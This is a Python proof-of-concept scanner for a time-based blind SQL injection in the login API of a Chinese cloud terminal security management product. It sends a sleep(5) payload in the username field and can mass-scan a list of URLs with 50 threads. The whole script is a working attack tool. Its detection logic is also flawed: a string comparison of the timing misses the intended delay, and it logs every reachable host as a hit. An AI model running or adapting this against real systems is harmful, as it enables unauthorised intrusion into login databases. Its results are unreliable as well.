# 云终端安全管理系统 login SQL注入漏洞
import argparse, requests, sys, time, re
from termcolor import colored
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    test = """
██╗   ██╗███████╗██████╗       ███████╗ ██████╗ ██╗     
╚██╗ ██╔╝╚══███╔╝██╔══██╗      ██╔════╝██╔═══██╗██║     
 ╚████╔╝   ███╔╝ ██║  ██║█████╗███████╗██║   ██║██║     
  ╚██╔╝   ███╔╝  ██║  ██║╚════╝╚════██║██║▄▄ ██║██║     
   ██║   ███████╗██████╔╝      ███████║╚██████╔╝███████╗
   ╚═╝   ╚══════╝╚═════╝       ╚══════╝ ╚══▀▀═╝ ╚══════╝

                              
"""
    colored_color = colored(test, 'blue')
    print(colored_color)


def main():
    banner()
    parser = argparse.ArgumentParser(description='云终端安全管理系统 login SQL注入漏洞POC')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    api_payload = "/api/user/login"
    headers = {
        'Content-Length': '102',
        'Sec-Ch-Ua': '"Chromium";v="109", "Not_A Brand";v="99"',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9'
    }
    data = "captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='"
    try:
        res = requests.get(url=target, verify=False)
        res1 = requests.post(url=target + api_payload, headers=headers, data=data, verify=False)
        time = str(res1.elapsed.total_seconds())[0]
        if res.status_code == 200:
            if res1.status_code == 200 and '4' < time < '5':
                print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()